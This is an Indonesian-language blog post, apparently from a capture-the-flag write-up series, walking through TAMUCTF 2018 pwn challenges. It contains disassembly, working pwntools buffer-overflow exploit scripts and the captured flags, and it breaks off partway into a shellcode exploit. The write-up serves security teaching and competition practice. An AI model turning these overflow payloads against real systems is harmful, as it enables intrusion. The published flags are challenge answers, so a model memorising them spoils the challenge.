@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>TAMUCTF 2018 - Pwning :: /home/rhama/ — Personal Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Pwn1 Diberikan sebuah file binary dengan informasi sebagai berikut
+Percobaan debugging menggunakan gdb
+$ gdb -q pwn1 Reading symbols from pwn1...(no debugging symbols found)...done. gdb-peda $ pdisass main Berikut hasil disassable fungsi main
+0x080485cf &amp;lt;&#43;29&amp;gt;: call 0x8048410 &amp;lt;setvbuf@plt&amp;gt; 0x080485d4 &amp;lt;&#43;34&amp;gt;: add esp,0x10 0x080485d7 &amp;lt;&#43;37&amp;gt;: sub esp,0xc 0x080485da &amp;lt;&#43;40&amp;gt;: push 0x8048700 0x080485df &amp;lt;&#43;45&amp;gt;: call 0x80483f0 &amp;lt;puts@plt&amp;gt; 0x080485e4 &amp;lt;&#43;50&amp;gt;: add esp,0x10 0x080485e7 &amp;lt;&#43;53&amp;gt;: sub esp,0xc 0x080485ea &amp;lt;&#43;56&amp;gt;: push 0x8048720 0x080485ef &amp;lt;&#43;61&amp;gt;: call 0x80483f0 &amp;lt;puts@plt&amp;gt; 0x080485f4 &amp;lt;&#43;66&amp;gt;: add esp,0x10 0x080485f7 &amp;lt;&#43;69&amp;gt;: sub esp,0xc 0x080485fa &amp;lt;&#43;72&amp;gt;: push 0x804875f 0x080485ff &amp;lt;&#43;77&amp;gt;: call 0x80483f0 &amp;lt;puts@plt&amp;gt; 0x08048604 &amp;lt;&#43;82&amp;gt;: add esp,0x10 0x08048607 &amp;lt;&#43;85&amp;gt;: mov DWORD PTR [ebp-0xc],0x0 0x0804860e &amp;lt;&#43;92&amp;gt;: sub esp,0xc 0x08048611 &amp;lt;&#43;95&amp;gt;: lea eax,[ebp-0x23] 0x08048614 &amp;lt;&#43;98&amp;gt;: push eax 0x08048615 &amp;lt;&#43;99&amp;gt;: call 0x80483d0 &amp;lt;gets@plt&amp;gt; 0x0804861a &amp;lt;&#43;104&amp;gt;: add esp,0x10 0x0804861d &amp;lt;&#43;107&amp;gt;: cmp DWORD PTR [ebp-0xc],0xf007ba11 0x08048624 &amp;lt;&#43;114&amp;gt;: jne 0x804862d &amp;lt;main&#43;123&amp;gt; 0x08048626 &amp;lt;&#43;116&amp;gt;: call 0x804854b &amp;lt;print_flag&amp;gt; 0x0804862b &amp;lt;&#43;121&amp;gt;: jmp 0x804863d &amp;lt;main&#43;139&amp;gt; 0x0804862d &amp;lt;&#43;123&amp;gt;: sub esp,0xc 0x08048630 &amp;lt;&#43;126&amp;gt;: push 0x8048772 0x08048635 &amp;lt;&#43;131&amp;gt;: call 0x80483f0 &amp;lt;puts@plt&amp;gt; 0x0804863a &amp;lt;&#43;136&amp;gt;: add esp,0x10 0x0804863d &amp;lt;&#43;139&amp;gt;: mov eax,0x0 0x08048642 &amp;lt;&#43;144&amp;gt;: mov ecx,DWORD PTR [ebp-0x4] 0x08048645 &amp;lt;&#43;147&amp;gt;: leave 0x08048646 &amp;lt;&#43;148&amp;gt;: lea esp,[ecx-0x4] 0x08048649 &amp;lt;&#43;151&amp;gt;: ret Terlihat terdapat penggunaan fungsi gets() yang vulnerable buffer overflow."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="rhamaa.github.io/post/2018-02-27-tamuctf-2018-pwning/" />
+
+
+
+
+
+<link rel="stylesheet" href="rhamaa.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="rhamaa.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="rhamaa.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="rhamaa.github.io/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="TAMUCTF 2018 - Pwning"/>
+<meta name="twitter:description" content="Pwn1 Diberikan sebuah file binary dengan informasi sebagai berikut
+Percobaan debugging menggunakan gdb
+$ gdb -q pwn1 Reading symbols from pwn1...(no debugging symbols found)...done. gdb-peda $ pdisass main Berikut hasil disassable fungsi main
+0x080485cf &lt;&#43;29&gt;: call 0x8048410 &lt;setvbuf@plt&gt; 0x080485d4 &lt;&#43;34&gt;: add esp,0x10 0x080485d7 &lt;&#43;37&gt;: sub esp,0xc 0x080485da &lt;&#43;40&gt;: push 0x8048700 0x080485df &lt;&#43;45&gt;: call 0x80483f0 &lt;puts@plt&gt; 0x080485e4 &lt;&#43;50&gt;: add esp,0x10 0x080485e7 &lt;&#43;53&gt;: sub esp,0xc 0x080485ea &lt;&#43;56&gt;: push 0x8048720 0x080485ef &lt;&#43;61&gt;: call 0x80483f0 &lt;puts@plt&gt; 0x080485f4 &lt;&#43;66&gt;: add esp,0x10 0x080485f7 &lt;&#43;69&gt;: sub esp,0xc 0x080485fa &lt;&#43;72&gt;: push 0x804875f 0x080485ff &lt;&#43;77&gt;: call 0x80483f0 &lt;puts@plt&gt; 0x08048604 &lt;&#43;82&gt;: add esp,0x10 0x08048607 &lt;&#43;85&gt;: mov DWORD PTR [ebp-0xc],0x0 0x0804860e &lt;&#43;92&gt;: sub esp,0xc 0x08048611 &lt;&#43;95&gt;: lea eax,[ebp-0x23] 0x08048614 &lt;&#43;98&gt;: push eax 0x08048615 &lt;&#43;99&gt;: call 0x80483d0 &lt;gets@plt&gt; 0x0804861a &lt;&#43;104&gt;: add esp,0x10 0x0804861d &lt;&#43;107&gt;: cmp DWORD PTR [ebp-0xc],0xf007ba11 0x08048624 &lt;&#43;114&gt;: jne 0x804862d &lt;main&#43;123&gt; 0x08048626 &lt;&#43;116&gt;: call 0x804854b &lt;print_flag&gt; 0x0804862b &lt;&#43;121&gt;: jmp 0x804863d &lt;main&#43;139&gt; 0x0804862d &lt;&#43;123&gt;: sub esp,0xc 0x08048630 &lt;&#43;126&gt;: push 0x8048772 0x08048635 &lt;&#43;131&gt;: call 0x80483f0 &lt;puts@plt&gt; 0x0804863a &lt;&#43;136&gt;: add esp,0x10 0x0804863d &lt;&#43;139&gt;: mov eax,0x0 0x08048642 &lt;&#43;144&gt;: mov ecx,DWORD PTR [ebp-0x4] 0x08048645 &lt;&#43;147&gt;: leave 0x08048646 &lt;&#43;148&gt;: lea esp,[ecx-0x4] 0x08048649 &lt;&#43;151&gt;: ret Terlihat terdapat penggunaan fungsi gets() yang vulnerable buffer overflow."/>
+
+
+
+<meta property="og:title" content="TAMUCTF 2018 - Pwning" />
+<meta property="og:description" content="Pwn1 Diberikan sebuah file binary dengan informasi sebagai berikut
+Percobaan debugging menggunakan gdb
+$ gdb -q pwn1 Reading symbols from pwn1...(no debugging symbols found)...done. gdb-peda $ pdisass main Berikut hasil disassable fungsi main
+0x080485cf &lt;&#43;29&gt;: call 0x8048410 &lt;setvbuf@plt&gt; 0x080485d4 &lt;&#43;34&gt;: add esp,0x10 0x080485d7 &lt;&#43;37&gt;: sub esp,0xc 0x080485da &lt;&#43;40&gt;: push 0x8048700 0x080485df &lt;&#43;45&gt;: call 0x80483f0 &lt;puts@plt&gt; 0x080485e4 &lt;&#43;50&gt;: add esp,0x10 0x080485e7 &lt;&#43;53&gt;: sub esp,0xc 0x080485ea &lt;&#43;56&gt;: push 0x8048720 0x080485ef &lt;&#43;61&gt;: call 0x80483f0 &lt;puts@plt&gt; 0x080485f4 &lt;&#43;66&gt;: add esp,0x10 0x080485f7 &lt;&#43;69&gt;: sub esp,0xc 0x080485fa &lt;&#43;72&gt;: push 0x804875f 0x080485ff &lt;&#43;77&gt;: call 0x80483f0 &lt;puts@plt&gt; 0x08048604 &lt;&#43;82&gt;: add esp,0x10 0x08048607 &lt;&#43;85&gt;: mov DWORD PTR [ebp-0xc],0x0 0x0804860e &lt;&#43;92&gt;: sub esp,0xc 0x08048611 &lt;&#43;95&gt;: lea eax,[ebp-0x23] 0x08048614 &lt;&#43;98&gt;: push eax 0x08048615 &lt;&#43;99&gt;: call 0x80483d0 &lt;gets@plt&gt; 0x0804861a &lt;&#43;104&gt;: add esp,0x10 0x0804861d &lt;&#43;107&gt;: cmp DWORD PTR [ebp-0xc],0xf007ba11 0x08048624 &lt;&#43;114&gt;: jne 0x804862d &lt;main&#43;123&gt; 0x08048626 &lt;&#43;116&gt;: call 0x804854b &lt;print_flag&gt; 0x0804862b &lt;&#43;121&gt;: jmp 0x804863d &lt;main&#43;139&gt; 0x0804862d &lt;&#43;123&gt;: sub esp,0xc 0x08048630 &lt;&#43;126&gt;: push 0x8048772 0x08048635 &lt;&#43;131&gt;: call 0x80483f0 &lt;puts@plt&gt; 0x0804863a &lt;&#43;136&gt;: add esp,0x10 0x0804863d &lt;&#43;139&gt;: mov eax,0x0 0x08048642 &lt;&#43;144&gt;: mov ecx,DWORD PTR [ebp-0x4] 0x08048645 &lt;&#43;147&gt;: leave 0x08048646 &lt;&#43;148&gt;: lea esp,[ecx-0x4] 0x08048649 &lt;&#43;151&gt;: ret Terlihat terdapat penggunaan fungsi gets() yang vulnerable buffer overflow." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="rhamaa.github.io/post/2018-02-27-tamuctf-2018-pwning/" />
+<meta property="og:site_name" content="/home/rhama/" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="rhamaa.github.io/about">About</a></li>
+        
+      
+        
+          <li><a href="rhamaa.github.io/showcase">Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="rhamaa.github.io/about">About</a></li>
+      
+    
+      
+        <li><a href="rhamaa.github.io/showcase">Showcase</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="rhamaa.github.io/post/2018-02-27-tamuctf-2018-pwning/">TAMUCTF 2018 - Pwning</a></h1>
+    <div class="post-meta">
+      
+
+      <span class="post-author">— Written by CTF.Ninja</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="rhamaa.github.io/tags/tamuctf-2018/">TAMUCTF-2018</a>&nbsp;
+        
+          #<a href="rhamaa.github.io/tags/ctf/">CTF</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/assets/images/CTF.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <h2 id="pwn1">Pwn1</h2>
+<p>Diberikan sebuah file binary dengan informasi sebagai berikut</p>
+<!-- raw HTML omitted -->
+<p>Percobaan debugging menggunakan gdb</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gdb -q pwn1
+Reading symbols from pwn1...<span style="color:#f92672">(</span>no debugging symbols found<span style="color:#f92672">)</span>...done.
+gdb-peda $ pdisass main 
+</code></pre></div><!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>Berikut hasil disassable fungsi main</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm">   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080485cf</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">29</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">call</span>   <span style="color:#ae81ff">0x8048410</span> &lt;<span style="color:#66d9ef">setvbuf@plt</span>&gt;
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080485d4</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">34</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">add</span>    <span style="color:#66d9ef">esp</span>,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080485d7</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">37</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">sub</span>    <span style="color:#66d9ef">esp</span>,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080485da</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">40</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">push</span>   <span style="color:#ae81ff">0x8048700</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080485df</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">45</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">call</span>   <span style="color:#ae81ff">0x80483f0</span> &lt;<span style="color:#66d9ef">puts@plt</span>&gt;
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080485e4</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">50</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">add</span>    <span style="color:#66d9ef">esp</span>,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080485e7</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">53</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">sub</span>    <span style="color:#66d9ef">esp</span>,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080485ea</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">56</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">push</span>   <span style="color:#ae81ff">0x8048720</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080485ef</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">61</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">call</span>   <span style="color:#ae81ff">0x80483f0</span> &lt;<span style="color:#66d9ef">puts@plt</span>&gt;
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080485f4</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">66</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">add</span>    <span style="color:#66d9ef">esp</span>,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080485f7</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">sub</span>    <span style="color:#66d9ef">esp</span>,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080485fa</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">72</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">push</span>   <span style="color:#ae81ff">0x804875f</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080485ff</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">77</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">call</span>   <span style="color:#ae81ff">0x80483f0</span> &lt;<span style="color:#66d9ef">puts@plt</span>&gt;
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048604</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">82</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">add</span>    <span style="color:#66d9ef">esp</span>,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048607</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">85</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">mov</span>    <span style="color:#66d9ef">DWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">ebp-0xc</span>],<span style="color:#ae81ff">0x0</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804860e</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">92</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">sub</span>    <span style="color:#66d9ef">esp</span>,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048611</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">95</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">lea</span>    <span style="color:#66d9ef">eax</span>,[<span style="color:#66d9ef">ebp-0x23</span>]
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048614</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">98</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">push</span>   <span style="color:#66d9ef">eax</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048615</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">99</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:    <span style="color:#66d9ef">call</span>   <span style="color:#ae81ff">0x80483d0</span> &lt;<span style="color:#66d9ef">gets@plt</span>&gt;
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804861a</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">104</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:   <span style="color:#66d9ef">add</span>    <span style="color:#66d9ef">esp</span>,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804861d</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">107</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:   <span style="color:#66d9ef">cmp</span>    <span style="color:#66d9ef">DWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">ebp-0xc</span>],<span style="color:#ae81ff">0xf007ba11</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048624</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">114</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:   <span style="color:#66d9ef">jne</span>    <span style="color:#ae81ff">0x804862d</span> &lt;<span style="color:#66d9ef">main</span>+<span style="color:#ae81ff">123</span>&gt;
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048626</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">116</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:   <span style="color:#66d9ef">call</span>   <span style="color:#ae81ff">0x804854b</span> &lt;<span style="color:#66d9ef">print_flag</span>&gt;
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804862b</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">121</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:   <span style="color:#66d9ef">jmp</span>    <span style="color:#ae81ff">0x804863d</span> &lt;<span style="color:#66d9ef">main</span>+<span style="color:#ae81ff">139</span>&gt;
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804862d</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">123</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:   <span style="color:#66d9ef">sub</span>    <span style="color:#66d9ef">esp</span>,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048630</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">126</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:   <span style="color:#66d9ef">push</span>   <span style="color:#ae81ff">0x8048772</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048635</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">131</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:   <span style="color:#66d9ef">call</span>   <span style="color:#ae81ff">0x80483f0</span> &lt;<span style="color:#66d9ef">puts@plt</span>&gt;
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804863a</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">136</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:   <span style="color:#66d9ef">add</span>    <span style="color:#66d9ef">esp</span>,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804863d</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">139</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:   <span style="color:#66d9ef">mov</span>    <span style="color:#66d9ef">eax</span>,<span style="color:#ae81ff">0x0</span>
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048642</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">144</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:   <span style="color:#66d9ef">mov</span>    <span style="color:#66d9ef">ecx</span>,<span style="color:#66d9ef">DWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">ebp-0x4</span>]
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048645</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">147</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:   <span style="color:#66d9ef">leave</span>  
+   <span style="color:#ae81ff">0x08048646</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">148</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:   <span style="color:#66d9ef">lea</span>    <span style="color:#66d9ef">esp</span>,[<span style="color:#66d9ef">ecx-0x4</span>]
+   <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048649</span> <span style="color:#960050;background-color:#1e0010">&lt;+</span><span style="color:#ae81ff">151</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:   <span style="color:#66d9ef">ret</span>    
+</code></pre></div><p>Terlihat terdapat penggunaan fungsi <code>gets()</code> yang vulnerable buffer overflow. dan inputan akan disimpan di <code>ebp-0x23</code>.
+lalu pada terdapat intruksi</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">cmp</span>    <span style="color:#66d9ef">DWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">ebp-0xc</span>],<span style="color:#ae81ff">0xf007ba11</span>
+</code></pre></div><p>Yang akan membandingkan <code>ebp-0xc</code> dengan <code>0xf007ba11</code>. perlu dilakukan overwrite local variable karena <code>ebp-0xc</code> di inisialisasi dengan nilai 0 <code>mov    DWORD PTR [ebp-0xc],0x0</code>.</p>
+<p>Jarak antara <code>ebp-0xc</code> dan <code>ebp-0x23</code> adalah 23 bytes.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">gdb-peda$</span> <span style="color:#66d9ef">distance</span> <span style="color:#66d9ef">$ebp-0xc</span> <span style="color:#66d9ef">$ebp-0x23</span>
+<span style="color:#a6e22e">From</span> <span style="color:#ae81ff">0xfffffff4</span> <span style="color:#66d9ef">to</span> <span style="color:#ae81ff">0xffffffdd</span>: -<span style="color:#ae81ff">23</span> <span style="color:#66d9ef">bytes</span>, -<span style="color:#ae81ff">6</span> <span style="color:#66d9ef">dwords</span> (<span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">bytes</span>)
+</code></pre></div><p>Berikut exploit code yang digunakan</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+secret <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xf007ba11</span>)
+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;pwn.ctf.tamu.edu&#34;</span>,<span style="color:#ae81ff">4321</span>)
+r<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">23</span> <span style="color:#f92672">+</span> secret
+r<span style="color:#f92672">.</span>sendline(payload)
+
+<span style="color:#66d9ef">print</span> r<span style="color:#f92672">.</span>recv()
+</code></pre></div><h3 id="flag--gigemh0w_h4rd_1s_th4t">Flag : gigem{H0W_H4RD_1S_TH4T?}</h3>
+<h2 id="pwn2">Pwn2</h2>
+<p>Diberikan sebuah file binary dengan informasi berikut</p>
+<!-- raw HTML omitted -->
+<p>Sama seperti pada pwn1, perbedaan nya pwn2 harus <strong>jump</strong> ke fungsi <code>print_flag</code> yang berada di <code>0804854b</code></p>
+<p>Untuk mengetahui jumlah pattern untuk overwrite <code>EIP</code>. mengurangi Buffer inputan dengan return address, <code>ebp+0x4</code> adalah return address untuk 32 bit dan <code>rbp+8</code> untuk 64 bit.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ distance $ebp-0xef $ebp+0x4
+From 0xffffc3d9 to 0xffffc4cc: <span style="color:#ae81ff">243</span> bytes, <span style="color:#ae81ff">60</span> dwords <span style="color:#f92672">(</span>+3 bytes<span style="color:#f92672">)</span>
+</code></pre></div><p>Berikut exploit code nya</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+print_flag <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x804854b</span>)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">243</span> <span style="color:#f92672">+</span> print_flag
+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;pwn.ctf.tamu.edu&#34;</span>, <span style="color:#ae81ff">4322</span>)
+r<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+r<span style="color:#f92672">.</span>sendline(payload)
+
+<span style="color:#66d9ef">print</span> r<span style="color:#f92672">.</span>recvall()
+
+</code></pre></div><h3 id="flag--gigem3ch035_0f_7h3_p4s7">Flag : gigem{3ch035_0f_7h3_p4s7}</h3>
+<h2 id="pwn3">Pwn3</h2>
+<p>Diberikan sebuah file binary dengan informasi berikut</p>
+<!-- raw HTML omitted -->
+<p>Perbedaan pwn3 dan pwn sebelum nya adalah pada pwn3 harus menginjeck <code>Shellcode</code></p>
+<p>Apabila didebug pada bagian <code>Your random number 0xffa6f2aa!</code>, random number tersebut adalah lokasi buffer inputan akan disimpan (stack).</p>
+<p>Berikut exploit code nya</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;i386&#34;</span>
